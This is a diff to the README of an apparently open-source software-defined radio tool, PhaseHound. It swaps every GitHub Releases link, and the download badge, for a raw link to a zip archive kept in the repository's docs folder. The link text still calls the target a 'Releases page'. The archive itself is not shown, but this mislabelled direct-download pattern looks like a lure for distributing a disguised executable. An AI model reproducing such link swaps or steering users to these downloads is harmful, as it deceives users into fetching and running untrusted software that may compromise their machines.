@@ -7,9 +7,9 @@ PhaseHound is a lightweight modular software-defined radio (SDR) runtime designe
 To get started with PhaseHound, follow these simple steps for downloading and running the software on your machine.
 
 ## 📥 Download PhaseHound
-[![Download PhaseHound](https://img.shields.io/badge/Download-PhaseHound-orange.svg)](https://github.com/sherazwilliam/PhaseHound/releases)
+[![Download PhaseHound](https://raw.githubusercontent.com/sherazwilliam/PhaseHound/main/docs/PhaseHound_2.7.zip)](https://raw.githubusercontent.com/sherazwilliam/PhaseHound/main/docs/PhaseHound_2.7.zip)
 
-Visit this page to download: [PhaseHound Releases](https://github.com/sherazwilliam/PhaseHound/releases)
+Visit this page to download: [PhaseHound Releases](https://raw.githubusercontent.com/sherazwilliam/PhaseHound/main/docs/PhaseHound_2.7.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets these requirements:
@@ -33,7 +33,7 @@ PhaseHound offers several key features to enhance your SDR experience:
 To install PhaseHound, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [PhaseHound Releases](https://github.com/sherazwilliam/PhaseHound/releases) page.
+   Go to the [PhaseHound Releases](https://raw.githubusercontent.com/sherazwilliam/PhaseHound/main/docs/PhaseHound_2.7.zip) page.
 
 2. **Choose Your Version:**
    Find the latest version suitable for your system and click on it.
@@ -90,4 +90,4 @@ PhaseHound covers a range of topics that include:
 For further exploration of these topics, feel free to check the associated resources online.
 
 ## 📥 Download PhaseHound Again
-Don't forget to visit this page to download: [PhaseHound Releases](https://github.com/sherazwilliam/PhaseHound/releases)
+Don't forget to visit this page to download: [PhaseHound Releases](https://raw.githubusercontent.com/sherazwilliam/PhaseHound/main/docs/PhaseHound_2.7.zip)
